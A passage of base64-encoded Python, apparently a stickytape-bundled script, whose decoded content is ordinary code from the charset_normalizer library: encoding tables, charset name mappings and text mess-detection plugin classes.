mRzd2l0aCgiX2NvZGVjIikgaXMgRmFsc2VcbiAgICAgICAgYW5kIHggbm90IGluIHsicm90XzEzIiwgInRhY3RpcyIsICJtYmNzIn0sXG4gICAgICAgIGxpc3Qoc2V0KGFsaWFzZXMudmFsdWVzKCkpKSxcbiAgICApXG4pICAjIHR5cGU6IExpc3Rbc3RyXVxuXG5JQU5BX1NVUFBPUlRFRF9DT1VOVCA9IGxlbihJQU5BX1NVUFBPUlRFRCkgICMgdHlwZTogaW50XG5cbiMgcHJlLWNvbXB1dGVkIGNvZGUgcGFnZSB0aGF0IGFyZSBzaW1pbGFyIHVzaW5nIHRoZSBmdW5jdGlvbiBjcF9zaW1pbGFyaXR5LlxuSUFOQV9TVVBQT1JURURfU0lNSUxBUiA9IHtcbiAgICAiY3AwMzciOiBbImNwMTAyNiIsICJjcDExNDAiLCAiY3AyNzMiLCAiY3A1MDAiXSxcbiAgICAiY3AxMDI2IjogWyJjcDAzNyIsICJjcDExNDAiLCAiY3AyNzMiLCAiY3A1MDAiXSxcbiAgICAiY3AxMTI1IjogWyJjcDg2NiJdLFxuICAgICJjcDExNDAiOiBbImNwMDM3IiwgImNwMTAyNiIsICJjcDI3MyIsICJjcDUwMCJdLFxuICAgICJjcDEyNTAiOiBbImlzbzg4NTlfMiJdLFxuICAgICJjcDEyNTEiOiBbImt6MTA0OCIsICJwdGNwMTU0Il0sXG4gICAgImNwMTI1MiI6IFsiaXNvODg1OV8xNSIsICJpc284ODU5XzkiLCAibGF0aW5fMSJdLFxuICAgICJjcDEyNTMiOiBbImlzbzg4NTlfNyJdLFxuICAgICJjcDEyNTQiOiBbImlzbzg4NTlfMTUiLCAiaXNvODg1OV85IiwgImxhdGluXzEiXSxcbiAgICAiY3AxMjU3IjogWyJpc284ODU5XzEzIl0sXG4gICAgImNwMjczIjogWyJjcDAzNyIsICJjcDEwMjYiLCAiY3AxMTQwIiwgImNwNTAwIl0sXG4gICAgImNwNDM3IjogWyJjcDg1MCIsICJjcDg1OCIsICJjcDg2MCIsICJjcDg2MSIsICJjcDg2MiIsICJjcDg2MyIsICJjcDg2NSJdLFxuICAgICJjcDUwMCI6IFsiY3AwMzciLCAiY3AxMDI2IiwgImNwMTE0MCIsICJjcDI3MyJdLFxuICAgICJjcDg1MCI6IFsiY3A0MzciLCAiY3A4NTciLCAiY3A4NTgiLCAiY3A4NjUiXSxcbiAgICAiY3A4NTciOiBbImNwODUwIiwgImNwODU4IiwgImNwODY1Il0sXG4gICAgImNwODU4IjogWyJjcDQzNyIsICJjcDg1MCIsICJjcDg1NyIsICJjcDg2NSJdLFxuICAgICJjcDg2MCI6IFsiY3A0MzciLCAiY3A4NjEiLCAiY3A4NjIiLCAiY3A4NjMiLCAiY3A4NjUiXSxcbiAgICAiY3A4NjEiOiBbImNwNDM3IiwgImNwODYwIiwgImNwODYyIiwgImNwODYzIiwgImNwODY1Il0sXG4gICAgImNwODYyIjogWyJjcDQzNyIsICJjcDg2MCIsICJjcDg2MSIsICJjcDg2MyIsICJjcDg2NSJdLFxuICAgICJjcDg2MyI6IFsiY3A0MzciLCAiY3A4NjAiLCAiY3A4NjEiLCAiY3A4NjIiLCAiY3A4NjUiXSxcbiAgICAiY3A4NjUiOiBbImNwNDM3IiwgImNwODUwIiwgImNwODU3IiwgImNwODU4IiwgImNwODYwIiwgImNwODYxIiwgImNwODYyIiwgImNwODYzIl0sXG4gICAgImNwODY2IjogWyJjcDExMjUiXSxcbiAgICAiaXNvODg1OV8xMCI6IFsiaXNvODg1OV8xNCIsICJpc284ODU5XzE1IiwgImlzbzg4NTlfNCIsICJpc284ODU5XzkiLCAibGF0aW5fMSJdLFxuICAgICJpc284ODU5XzExIjogWyJ0aXNfNjIwIl0sXG4gICAgImlzbzg4NTlfMTMiOiBbImNwMTI1NyJdLFxuICAgICJpc284ODU5XzE0IjogW1xuICAgICAgICAiaXNvODg1OV8xMCIsXG4gICAgICAgICJpc284ODU5XzE1IixcbiAgICAgICAgImlzbzg4NTlfMTYiLFxuICAgICAgICAiaXNvODg1OV8zIixcbiAgICAgICAgImlzbzg4NTlfOSIsXG4gICAgICAgICJsYXRpbl8xIixcbiAgICBdLFxuICAgICJpc284ODU5XzE1IjogW1xuICAgICAgICAiY3AxMjUyIixcbiAgICAgICAgImNwMTI1NCIsXG4gICAgICAgICJpc284ODU5XzEwIixcbiAgICAgICAgImlzbzg4NTlfMTQiLFxuICAgICAgICAiaXNvODg1OV8xNiIsXG4gICAgICAgICJpc284ODU5XzMiLFxuICAgICAgICAiaXNvODg1OV85IixcbiAgICAgICAgImxhdGluXzEiLFxuICAgIF0sXG4gICAgImlzbzg4NTlfMTYiOiBbXG4gICAgICAgICJpc284ODU5XzE0IixcbiAgICAgICAgImlzbzg4NTlfMTUiLFxuICAgICAgICAiaXNvODg1OV8yIixcbiAgICAgICAgImlzbzg4NTlfMyIsXG4gICAgICAgICJpc284ODU5XzkiLFxuICAgICAgICAibGF0aW5fMSIsXG4gICAgXSxcbiAgICAiaXNvODg1OV8yIjogWyJjcDEyNTAiLCAiaXNvODg1OV8xNiIsICJpc284ODU5XzQiXSxcbiAgICAiaXNvODg1OV8zIjogWyJpc284ODU5XzE0IiwgImlzbzg4NTlfMTUiLCAiaXNvODg1OV8xNiIsICJpc284ODU5XzkiLCAibGF0aW5fMSJdLFxuICAgICJpc284ODU5XzQiOiBbImlzbzg4NTlfMTAiLCAiaXNvODg1OV8yIiwgImlzbzg4NTlfOSIsICJsYXRpbl8xIl0sXG4gICAgImlzbzg4NTlfNyI6IFsiY3AxMjUzIl0sXG4gICAgImlzbzg4NTlfOSI6IFtcbiAgICAgICAgImNwMTI1MiIsXG4gICAgICAgICJjcDEyNTQiLFxuICAgICAgICAiY3AxMjU4IixcbiAgICAgICAgImlzbzg4NTlfMTAiLFxuICAgICAgICAiaXNvODg1OV8xNCIsXG4gICAgICAgICJpc284ODU5XzE1IixcbiAgICAgICAgImlzbzg4NTlfMTYiLFxuICAgICAgICAiaXNvODg1OV8zIixcbiAgICAgICAgImlzbzg4NTlfNCIsXG4gICAgICAgICJsYXRpbl8xIixcbiAgICBdLFxuICAgICJrejEwNDgiOiBbImNwMTI1MSIsICJwdGNwMTU0Il0sXG4gICAgImxhdGluXzEiOiBbXG4gICAgICAgICJjcDEyNTIiLFxuICAgICAgICAiY3AxMjU0IixcbiAgICAgICAgImNwMTI1OCIsXG4gICAgICAgICJpc284ODU5XzEwIixcbiAgICAgICAgImlzbzg4NTlfMTQiLFxuICAgICAgICAiaXNvODg1OV8xNSIsXG4gICAgICAgICJpc284ODU5XzE2IixcbiAgICAgICAgImlzbzg4NTlfMyIsXG4gICAgICAgICJpc284ODU5XzQiLFxuICAgICAgICAiaXNvODg1OV85IixcbiAgICBdLFxuICAgICJtYWNfaWNlbGFuZCI6IFsibWFjX3JvbWFuIiwgIm1hY190dXJraXNoIl0sXG4gICAgIm1hY19yb21hbiI6IFsibWFjX2ljZWxhbmQiLCAibWFjX3R1cmtpc2giXSxcbiAgICAibWFjX3R1cmtpc2giOiBbIm1hY19pY2VsYW5kIiwgIm1hY19yb21hbiJdLFxuICAgICJwdGNwMTU0IjogWyJjcDEyNTEiLCAia3oxMDQ4Il0sXG4gICAgInRpc182MjAiOiBbImlzbzg4NTlfMTEiXSxcbn0gICMgdHlwZTogRGljdFtzdHIsIExpc3Rbc3RyXV1cblxuXG5DSEFSREVUX0NPUlJFU1BPTkRFTkNFID0ge1xuICAgICJpc28yMDIyX2tyIjogIklTTy0yMDIyLUtSIixcbiAgICAiaXNvMjAyMl9qcCI6ICJJU08tMjAyMi1KUCIsXG4gICAgImV1Y19rciI6ICJFVUMtS1IiLFxuICAgICJ0aXNfNjIwIjogIlRJUy02MjAiLFxuICAgICJ1dGZfMzIiOiAiVVRGLTMyIixcbiAgICAiZXVjX2pwIjogIkVVQy1KUCIsXG4gICAgImtvaThfciI6ICJLT0k4LVIiLFxuICAgICJpc284ODU5XzEiOiAiSVNPLTg4NTktMSIsXG4gICAgImlzbzg4NTlfMiI6ICJJU08tODg1OS0yIixcbiAgICAiaXNvODg1OV81IjogIklTTy04ODU5LTUiLFxuICAgICJpc284ODU5XzYiOiAiSVNPLTg4NTktNiIsXG4gICAgImlzbzg4NTlfNyI6ICJJU08tODg1OS03IixcbiAgICAiaXNvODg1OV84IjogIklTTy04ODU5LTgiLFxuICAgICJ1dGZfMTYiOiAiVVRGLTE2IixcbiAgICAiY3A4NTUiOiAiSUJNODU1IixcbiAgICAibWFjX2N5cmlsbGljIjogIk1hY0N5cmlsbGljIixcbiAgICAiZ2IyMzEyIjogIkdCMjMxMiIsXG4gICAgImdiMTgwMzAiOiAiR0IxODAzMCIsXG4gICAgImNwOTMyIjogIkNQOTMyIixcbiAgICAiY3A4NjYiOiAiSUJNODY2IixcbiAgICAidXRmXzgiOiAidXRmLTgiLFxuICAgICJ1dGZfOF9zaWciOiAiVVRGLTgtU0lHIixcbiAgICAic2hpZnRfamlzIjogIlNISUZUX0pJUyIsXG4gICAgImJpZzUiOiAiQmlnNSIsXG4gICAgImNwMTI1MCI6ICJ3aW5kb3dzLTEyNTAiLFxuICAgICJjcDEyNTEiOiAid2luZG93cy0xMjUxIixcbiAgICAiY3AxMjUyIjogIldpbmRvd3MtMTI1MiIsXG4gICAgImNwMTI1MyI6ICJ3aW5kb3dzLTEyNTMiLFxuICAgICJjcDEyNTUiOiAid2luZG93cy0xMjU1IixcbiAgICAiY3AxMjU2IjogIndpbmRvd3MtMTI1NiIsXG4gICAgImNwMTI1NCI6ICJXaW5kb3dzLTEyNTQiLFxuICAgICJjcDk0OSI6ICJDUDk0OSIsXG59ICAjIHR5cGU6IERpY3Rbc3RyLCBzdHJdXG5cblxuQ09NTU9OX1NBRkVfQVNDSUlfQ0hBUkFDVEVSUyA9IHtcbiAgICAiPCIsXG4gICAgIj4iLFxuICAgICI9IixcbiAgICAiOiIsXG4gICAgIi8iLFxuICAgICImIixcbiAgICAiOyIsXG4gICAgInsiLFxuICAgICJ9IixcbiAgICAiWyIsXG4gICAgIl0iLFxuICAgICIsIixcbiAgICAifCIsXG4gICAgXCciXCcsXG4gICAgIi0iLFxufSAgIyB0eXBlOiBTZXRbc3RyXVxuXG5cbktPX05BTUVTID0geyJqb2hhYiIsICJjcDk0OSIsICJldWNfa3IifSAgIyB0eXBlOiBTZXRbc3RyXVxuWkhfTkFNRVMgPSB7ImJpZzUiLCAiY3A5NTAiLCAiYmlnNWhrc2NzIiwgImh6In0gICMgdHlwZTogU2V0W3N0cl1cblxuTk9UX1BSSU5UQUJMRV9QQVRURVJOID0gcmVfY29tcGlsZShyIlswLTlcXFdcXG5cXHJcXHRdKyIpXG5cbkxBTkdVQUdFX1NVUFBPUlRFRF9DT1VOVCA9IGxlbihGUkVRVUVOQ0lFUykgICMgdHlwZTogaW50XG5cbiMgTG9nZ2luZyBMRVZFTCBiZWxsb3cgREVCVUdcblRSQUNFID0gNSAgIyB0eXBlOiBpbnRcbicpCiAgICBfX3N0aWNreXRhcGVfd3JpdGVfbW9kdWxlKCdjaGFyc2V0X25vcm1hbGl6ZXIvbWQucHknLCBiJ2Zyb20gZnVuY3Rvb2xzIGltcG9ydCBscnVfY2FjaGVcbmZyb20gdHlwaW5nIGltcG9ydCBMaXN0LCBPcHRpb25hbFxuXG5mcm9tIC5jb25zdGFudCBpbXBvcnQgQ09NTU9OX1NBRkVfQVNDSUlfQ0hBUkFDVEVSUywgVU5JQ09ERV9TRUNPTkRBUllfUkFOR0VfS0VZV09SRFxuZnJvbSAudXRpbHMgaW1wb3J0IChcbiAgICBpc19hY2NlbnR1YXRlZCxcbiAgICBpc19hc2NpaSxcbiAgICBpc19jYXNlX3ZhcmlhYmxlLFxuICAgIGlzX2NqayxcbiAgICBpc19lbW90aWNvbixcbiAgICBpc19oYW5ndWwsXG4gICAgaXNfaGlyYWdhbmEsXG4gICAgaXNfa2F0YWthbmEsXG4gICAgaXNfbGF0aW4sXG4gICAgaXNfcHVuY3R1YXRpb24sXG4gICAgaXNfc2VwYXJhdG9yLFxuICAgIGlzX3N5bWJvbCxcbiAgICBpc190aGFpLFxuICAgIHJlbW92ZV9hY2NlbnQsXG4gICAgdW5pY29kZV9yYW5nZSxcbilcblxuXG5jbGFzcyBNZXNzRGV0ZWN0b3JQbHVnaW46XG4gICAgIiIiXG4gICAgQmFzZSBhYnN0cmFjdCBjbGFzcyB1c2VkIGZvciBtZXNzIGRldGVjdGlvbiBwbHVnaW5zLlxuICAgIEFsbCBkZXRlY3RvcnMgTVVTVCBleHRlbmQgYW5kIGltcGxlbWVudCBnaXZlbiBtZXRob2RzLlxuICAgICIiIlxuXG4gICAgZGVmIGVsaWdpYmxlKHNlbGYsIGNoYXJhY3Rlcjogc3RyKSAtPiBib29sOlxuICAgICAgICAiIiJcbiAgICAgICAgRGV0ZXJtaW5lIGlmIGdpdmVuIGNoYXJhY3RlciBzaG91bGQgYmUgZmVkIGluLlxuICAgICAgICAiIiJcbiAgICAgICAgcmFpc2UgTm90SW1wbGVtZW50ZWRFcnJvciAgIyBwcmFnbWE6IG5vY292ZXJcblxuICAgIGRlZiBmZWVkKHNlbGYsIGNoYXJhY3Rlcjogc3RyKSAtPiBOb25lOlxuICAgICAgICAiIiJcbiAgICAgICAgVGhlIG1haW4gcm91dGluZSB0byBiZSBleGVjdXRlZCB1cG9uIGNoYXJhY3Rlci5cbiAgICAgICAgSW5zZXJ0IHRoZSBsb2dpYyBpbiB3aXRjaCB0aGUgdGV4dCB3b3VsZCBiZSBjb25zaWRlcmVkIGNoYW90aWMuXG4gICAgICAgICIiIlxuICAgICAgICByYWlzZSBOb3RJbXBsZW1lbnRlZEVycm9yICAjIHByYWdtYTogbm9jb3ZlclxuXG4gICAgZGVmIHJlc2V0KHNlbGYpIC0+IE5vbmU6ICAjIHByYWdtYTogbm8gY292ZXJcbiAgICAgICAgIiIiXG4gICAgICAgIFBlcm1pdCB0byByZXNldCB0aGUgcGx1Z2luIHRvIHRoZSBpbml0aWFsIHN0YXRlLlxuICAgICAgICAiIiJcbiAgICAgICAgcmFpc2UgTm90SW1wbGVtZW50ZWRFcnJvclxuXG4gICAgQHByb3BlcnR5XG4gICAgZGVmIHJhdGlvKHNlbGYpIC0+IGZsb2F0OlxuICAgICAgICAiIiJcbiAgICAgICAgQ29tcHV0ZSB0aGUgY2hhb3MgcmF0aW8gYmFzZWQgb24gd2hhdCB5b3VyIGZlZWQoKSBoYXMgc2Vlbi5cbiAgICAgICAgTXVzdCBOT1QgYmUgbG93ZXIgdGhhbiAwLjsgTm8gcmVzdHJpY3Rpb24gZ3QgMC5cbiAgICAgICAgIiIiXG4gICAgICAgIHJhaXNlIE5vdEltcGxlbWVudGVkRXJyb3IgICMgcHJhZ21hOiBub2NvdmVyXG5cblxuY2xhc3MgVG9vTWFueVN5bWJvbE9yUHVuY3R1YXRpb25QbHVnaW4oTWVzc0RldGVjdG9yUGx1Z2luKTpcbiAgICBkZWYgX19pbml0X18oc2VsZikgLT4gTm9uZTpcbiAgICAgICAgc2VsZi5fcHVuY3R1YXRpb25fY291bnQgPSAwICAjIHR5cGU6IGludFxuICAgICAgICBzZWxmLl9zeW1ib2xfY291bnQgPSAwICAjIHR5cGU6IGludFxuICAgICAgICBzZWxmLl9jaGFyYWN0ZXJfY291bnQgPSAwICAjIHR5cGU6IGludFxuXG4gICAgICAgIHNlbGYuX2xhc3RfcHJpbnRhYmxlX2NoYXIgPSBOb25lICAjIHR5cGU6IE9wdGlvbmFsW3N0cl1cbiAgICAgICAgc2VsZi5fZnJlbnp5X3N5bWJvbF9pbl93b3JkID0gRmFsc2UgICMgdHlwZTogYm9vbFxuXG4gICAgZGVmIGVsaWdpYmxlKHNlbGYsIGNoYXJhY3Rlcjogc3RyKSAtPiBib29sOlxuICAgICAgICByZXR1cm4gY2hhcmFjdGVyLmlzcHJpbnRhYmxlKClcblxuICAgIGRlZiBmZWVkKHNlbGYsIGNoYXJhY3Rlcjogc3RyKSAtPiBOb25lOlxuICAgICAgICBzZWxmLl9jaGFyYWN0ZXJfY291bnQgKz0gMVxuXG4gICAgICAgIGlmIChcbiAgICAgICAgICAgIGNoYXJhY3RlciAhPSBzZWxmLl9sYXN0X3ByaW50YWJsZV9jaGFyXG4gICAgICAgICAgICBhbmQgY2hhcmFjdGVyIG5vdCBpbiBDT01NT05fU0FGRV9BU0NJSV9DSEFSQUNURVJTXG4gICAgICAgICk6XG4gICAgICAgICAgICBpZiBpc19wdW5jdHVhdGlvbihjaGFyYWN0ZXIpOlxuICAgICAgICAgICAgICAgIHNlbGYuX3B1bmN0dWF0aW9uX2NvdW50ICs9IDFcbiAgICAgICAgICAgIGVsaWYgKFxuICAgICAgICAgICAgICAgIGNoYXJhY3Rlci5pc2RpZ2l0KCkgaXMgRmFsc2VcbiAgICAgICAgICAgICAgICBhbmQgaXNfc3ltYm9sKGNoYXJhY3RlcilcbiAgICAgICAgICAgICAgICBhbmQgaXNfZW1vdGljb24oY2hhcmFjdGVyKSBpcyBGYWxzZVxuICAgICAgICAgICAgKTpcbiAgICAgICAgICAgICAgICBzZWxmLl9zeW1ib2xfY291bnQgKz0gMlxuXG4gICAgICAgIHNlbGYuX2xhc3RfcHJpbnRhYmxlX2NoYXIgPSBjaGFyYWN0ZXJcblxuICAgIGRlZiByZXNldChzZWxmKSAtPiBOb25lOiAgIyBwcmFnbWE6IG5vIGNvdmVyXG4gICAgICAgIHNlbGYuX3B1bmN0dWF0aW9uX2NvdW50ID0gMFxuICAgICAgICBzZWxmLl9jaGFyYWN0ZXJfY291bnQgPSAwXG4gICAgICAgIHNlbGYuX3N5bWJvbF9jb3VudCA9IDBcblxuICAgIEBwcm9wZXJ0eVxuICAgIGRlZiByYXRpbyhzZWxmKSAtPiBmbG9hdDpcbiAgICAgICAgaWYgc2VsZi5fY2hhcmFjdGVyX2NvdW50ID09IDA6XG4gICAgICAgICAgICByZXR1cm4gMC4wXG5cbiAgICAgICAgcmF0aW9fb2ZfcHVuY3R1YXRpb24gPSAoXG4gICAgICAgICAgICBzZWxmLl9wdW5jdHVhdGlvbl9jb3VudCArIHNlbGYuX3N5bWJvbF9jb3VudFxuICAgICAgICApIC8gc2VsZi5fY2hhcmFjdGVyX2NvdW50ICAjIHR5cGU6IGZsb2F0XG5cbiAgICAgICAgcmV0dXJuIHJhdGlvX29mX3B1bmN0dWF0aW9uIGlmIHJhdGlvX29mX3B1bmN0dWF0aW9uID49IDAuMyBlbHNlIDAuMFxuXG5cbmNsYXNzIFRvb01hbnlBY2NlbnR1YXRlZFBsdWdpbihNZXNzRGV0ZWN0b3JQbHVnaW4pOlxuICAgIGRlZiBfX2luaXRfXyhzZWxmKSAtPiBOb25lOlxuICAgICAgICBzZWxmLl9jaGFyYWN0ZXJfY291bnQgPSAwICAjIHR5cGU6IGludFxuICAgICAgICBzZWxmLl9hY2NlbnR1YXRlZF9jb3VudCA9IDAgICMgdHlwZTogaW50XG5cbiAgICBkZWYgZWxpZ2libGUoc2VsZiwgY2hhcmFjdGVyOiBzdHIpIC0+IGJvb2w6XG4gICAgICAgIHJldHVybiBjaGFyYWN0ZXIuaXNhbHBoYSgpXG5cbiAgICBkZWYgZmVlZChzZWxmLCBjaGFyYWN0ZXI6IHN0cikgLT4gTm9uZTpcbiAgICAgICAgc2VsZi5fY2hhcmFjdGVyX2NvdW50ICs9IDFcblxuICAgICAgICBpZiBpc19hY2NlbnR1YXRlZChjaGFyYWN0ZXIpOlxuICAgICAgICAgICAgc2VsZi5fYWNjZW50dWF0ZWRfY291bnQgKz0gMVxuXG4gICAgZGVmIHJlc2V0KHNlbGYpIC0+IE5vbmU6ICAjIHByYWdtYTogbm8gY292ZXJcbiAgICAgICAgc2VsZi5fY2hhcmFjdGVyX2NvdW50ID0gMFxuICAgICAgICBzZWxmLl9hY2NlbnR1YXRlZF9jb3VudCA9IDBcblxuICAgIEBwcm9wZXJ0eVxuICAgIGRlZiByYXRpbyhzZWxmKSAtPiBmbG9hdDpcbiAgICAgICAgaWYgc2VsZi5fY2hhcmFjdGVyX2NvdW50ID09IDA6XG4gICAgICAgICAgICByZXR1cm4gMC4wXG4gICAgICAgIHJhdGlvX29mX2FjY2VudHVhdGlvbiA9IChcbiAgICAgICAgICAgIHNlbGYuX2FjY2VudHVhdGVkX2NvdW50IC8gc2VsZi5fY2hhcmFjdGVyX2NvdW50XG4gICAgICAgICkgICMgdHlwZTogZmxvYXRcbiAgICAgICAgcmV0dXJuIHJhdGlvX29mX2FjY2VudHVhdGlvbiBpZiByYXRpb19vZl9hY2NlbnR1YXRpb24gPj0gMC4zNSBlbHNlIDAuMFxuXG5cbmNsYXNzIFVucHJpbnRhYmxlUGx1Z2luKE1lc3NEZXRlY3RvclBsdWdpbik6XG4gICAgZGVmIF9faW5pdF9fKHNlbGYpIC0+IE5vbmU6XG4gICAgICAgIHNlbGYuX3VucHJpbnRhYmxlX2NvdW50ID0gMCAgIyB0eXBlOiBpbnRcbiAgICAgICAgc2VsZi5fY2hhcmFjdGVyX2NvdW50ID0gMCAgIyB0eXBlOiBpbnRcblxuICAgIGRlZiBlbGlnaWJsZShzZWxmLCBjaGFyYWN0ZXI6IHN0cikgLT4gYm9vbDpcbiAgICAgICAgcmV0dXJuIFRydWVcblxuICAgIGRlZiBmZWVkKHNlbGYsIGNoYXJhY3Rlcjogc3RyKSAtPiBOb25lOlxuICAgICAgICBpZiAoXG4gICAgICAgICAgICBjaGFyYWN0ZXIuaXNzcGFjZSgpIGlzIEZhbHNlICAjIGluY2x1ZGVzIFxcbiBcXHQgXFxyIFxcdlxuICAgICAgICAgICAgYW5kIGNoYXJhY3Rlci5pc3ByaW50YWJsZSgpIGlzIEZhbHNlXG4gICAgICAgICAgICBhbmQgY2hhcmFjdGVyICE9ICJcXHgxQSIgICMgV2h5PyBJdHMgdGhlIEFTQ0lJIHN1YnN0aXR1dGUgY2hhcmFjdGVyLlxuICAgICAgICApOlxuICAgICAgICAgICAgc2VsZi5fdW5wcmludGFibGVfY291bnQgKz0gMVxuICAgICAgICBzZWxmLl9jaGFyYWN0ZXJfY291bnQgKz0gMVxuXG4gICAgZGVmIHJlc2V0KHNlbGYpIC0+IE5vbmU6ICAjIHByYWdtYTogbm8gY292ZXJcbiAgICAgICAgc2VsZi5fdW5wcmludGFibGVfY291bnQgPSAwXG5cbiAgICBAcHJvcGVydHlcbiAgICBkZWYgcmF0aW8oc2VsZikgLT4gZmxvYXQ6XG4gICAgICAgIGlmIHNlbGYuX2NoYXJhY3Rlcl9jb3VudCA9PSAwOlxuICAgICAgICAgICAgcmV0dXJuIDAuMFxuXG4gICAgICAgIHJldHVybiAoc2VsZi5fdW5wcmludGFibGVfY291bnQgKiA4KSAvIHNlbGYuX2NoYXJhY3Rlcl9jb3VudFxuXG5cbmNsYXNzIFN1c3BpY2lvdXNEdXBsaWNhdGVBY2NlbnRQbHVnaW4oTWVzc0RldGVjdG9yUGx1Z2luKTpcbiAgICBkZWYgX19pbml0X18oc2VsZikgLT4gTm9uZTpcbiAgICAgICAgc2VsZi5fc3VjY2Vzc2l2ZV9jb3VudCA9IDAgICMgdHlwZTogaW50XG4gICAgICAgIHNlbGYuX2NoYXJhY3Rlcl9jb3VudCA9IDAgICMgdHlwZTogaW50XG5cbiAgICAgICAgc2VsZi5fbGFzdF9sYXRpbl9jaGFyYWN0ZXIgPSBOb25lICAjIHR5cGU6IE9wdGlvbmFsW3N0cl1cblxuICAgIGRlZiBlbGlnaWJsZShzZWxmLCBjaGFyYWN0ZXI6IHN0cikgLT4gYm9vbDpcbiAgICAgICAgcmV0dXJuIGNoYXJhY3Rlci5pc2FscGhhKCkgYW5kIGlzX2xhdGluKGNoYXJhY3RlcilcblxuICAgIGRlZiBmZWVkKHNlbGYsIGNoYXJhY3Rlcjogc3RyKSAtPiBOb25lOlxuICAgICAgICBzZWxmLl9jaGFyYWN0ZXJfY291bnQgKz0gMVxuICAgICAgICBpZiAoXG4gICAgICAgICAgICBzZWxmLl9sYXN0X2xhdGluX2NoYXJhY3RlciBpcyBub3QgTm9uZVxuICAgICAgICAgICAgYW5kIGlzX2FjY2VudHVhdGVkKGNoYXJhY3RlcilcbiAgICAgICAgICAgIGFuZCBpc19hY2NlbnR1YXRlZChzZWxmLl9sYXN0X2xhdGluX2NoYXJhY3RlcilcbiAgICAgICAgKTpcbiAgICAgICAgICAgIGlmIGNoYXJhY3Rlci5pc3VwcGVyKCkgYW5kIHNlbGYuX2xhc3RfbGF0aW5fY2hhcmFjdGVyLmlzdXBwZXIoKTpcbiAgICAgICAgICAgICAgICBzZWxmLl9zdWNjZXNzaXZlX2NvdW50ICs9IDFcbiAgICAgICAgICAgICMgV29yc2UgaWYgaXRzIHRoZSBzYW1lIGNoYXIgZHVwbGljYXRlZCB3aXRoIGRpZmZlcmVudCBhY2NlbnQuXG4gICAgICAgICAgICBpZiByZW1vdmVfYWNjZW50KGNoYXJhY3RlcikgPT0gcmVtb3ZlX2FjY2VudChzZWxmLl9sYXN0X2xhdGluX2NoYXJhY3Rlcik6XG4gICAgICAgICAgICAgICAgc2VsZi5fc3VjY2Vzc2l2ZV9jb3VudCArPSAxXG4gICAgICAgIHNlbGYuX2xhc3RfbGF0aW5fY2hhcmFjdGVyID0gY2hhcmFjdGVyXG5cbiAgICBkZWYgcmVzZXQoc2VsZikgLT4gTm9uZTogICMgcHJhZ21hOiBubyBjb3ZlclxuICAgICAgICBzZWxmLl9zdWNjZXNzaXZlX2NvdW50ID0gMFxuICAgICAgICBzZWxmLl9jaGFyYWN0ZXJfY291bnQgPSAwXG4gICAgICAgIHNlbGYuX2xhc3RfbGF0aW5fY2hhcmFjdGVyID0gTm9uZVxuXG4gICAgQHByb3BlcnR5XG4gICAgZGVmIHJhdGlvKHNlbGYpIC0+IGZsb2F0OlxuICAgICAgICBpZiBzZWxmLl9jaGFyYWN0ZXJfY291bnQgPT0gMDpcbiAgICAgICAgICAgIHJldHVybiAwLjBcblxuICAgICAgICByZXR1cm4gKHNlbGYuX3N1Y2Nlc3NpdmVfY291bnQgKiAyKSAvIHNlbGYuX2NoYXJhY3Rlcl9jb3VudFxuXG5cbmNsYXNzIFN1c3BpY2lvdXNSYW5nZShNZXNzRGV0ZWN0b3JQbHVnaW4pOlxuICAgIGRlZiBfX2luaXRfXyhzZWxmKSAtPiBOb25lOlxuICAgICAgICBzZWxmLl9zdXNwaWNpb3VzX3N1Y2Nlc3NpdmVfcmFuZ2VfY291bnQgPSAwICAjIHR5cGU6IGludFxuICAgICAgICBzZWxmLl9jaGFyYWN0ZXJfY291bnQgPSAwICAjIHR5cGU6IGludFxuICAgICAgICBzZWxmLl9sYXN0X3ByaW50YWJsZV9zZWVuID0gTm9uZSAgIyB0eXBlOiBPcHRpb25hbFtzdHJdXG5cbiAgICBkZWYgZWxpZ2libGUoc2VsZiwgY2hhcmFjdGVyOiBzdHIpIC0+IGJvb2w6XG4gICAgICAgIHJldHVybiBjaGFyYWN0ZXIuaXNwcmludGFibGUoKVxuXG4gICAgZGVmIGZlZWQoc2VsZiwgY2hhcmFjdGVyOiBzdHIpIC0+IE5vbmU6XG4gICAgICAgIHNlbGYuX2NoYXJhY3Rlcl9jb3VudCArPSAxXG5cbiAgICAgICAgaWYgKFxuICAgICAgICAgICAgY2hhcmFjdGVyLmlzc3BhY2UoKVxuICAgICAgICAgICAgb3IgaXNfcHVuY3R1YXRpb24oY2hhcmFjdGVyKVxuICAgICAgICAgICAgb3IgY2hhcmFjdGVyIGluIENPTU1PTl9TQUZFX0FTQ0lJX0NIQVJBQ1RFUlNcbiAgICAgICAgKTpcbiAgICAgICAgICAgIHNlbGYuX2xhc3RfcHJpbnRhYmxlX3NlZW4gPSBOb25lXG4gICAgICAgICAgICByZXR1cm5cblxuICAgICAgICBpZiBzZWxmLl9sYXN0X3ByaW50YWJsZV9zZWVuIGlzIE5vbmU6XG4gICAgICAgICAgICBzZWxmLl9sYXN0X3ByaW50YWJsZV9zZWVuID0gY2hhcmFjdGVyXG4gICAgICAgICAgICByZXR1cm5cblxuICAgICAgICB1bmljb2RlX3JhbmdlX2EgPSB1bmljb2RlX3JhbmdlKFxuICAgICAgICAgICAgc2VsZi5fbGFzdF9wcmludGFibGVfc2VlblxuICAgICAgICApICAjIHR5cGU6IE9wdGlvbmFsW3N0cl1cbiAgICAgICAgdW5pY29kZV9yYW5nZV9iID0gdW5pY29kZV9yYW5nZShjaGFyYWN0ZXIpICAjIHR5cGU6IE9wdGlvbmFsW3N0cl1cblxuICAgICAgICBpZiBpc19zdXNwaWNpb3VzbHlfc3VjY2Vzc2l2ZV9yYW5nZSh1bmljb2RlX3JhbmdlX2EsIHVuaWNvZGVfcmFuZ2VfYik6XG4gICAgICAgICAgICBzZWxmLl9zdXNwaWNpb3VzX3N1Y2Nlc3NpdmVfcmFuZ2VfY291bnQgKz0gMVxuXG4gICAgICAgIHNlbGYuX2xhc3RfcHJpbnRhYmxlX3NlZW4gPSBjaGFyYWN0ZXJcblxuICAgIGRlZiByZXNldChzZWxmKSAtPiBOb25lOiAgIyBwcmFnbWE6IG5vIGNvdmVyXG4gICAgICAgIHNlbGYuX2NoYXJhY3Rlcl9jb3VudCA9IDBcbiAgICAgICAgc2VsZi5fc3VzcGljaW91c19zdWNjZXNzaXZlX3JhbmdlX2NvdW50ID0gMFxuICAgICAgICBzZWxmLl9sYXN0X3ByaW50YWJsZV9zZWVuID0gTm9uZVxuXG4gICAgQHByb3BlcnR5XG4gICAgZGVmIHJhdGlvKHNlbGYpIC0+IGZsb2F0OlxuICAgICAgICBpZiBzZWxmLl9jaGFyYWN0ZXJfY291bn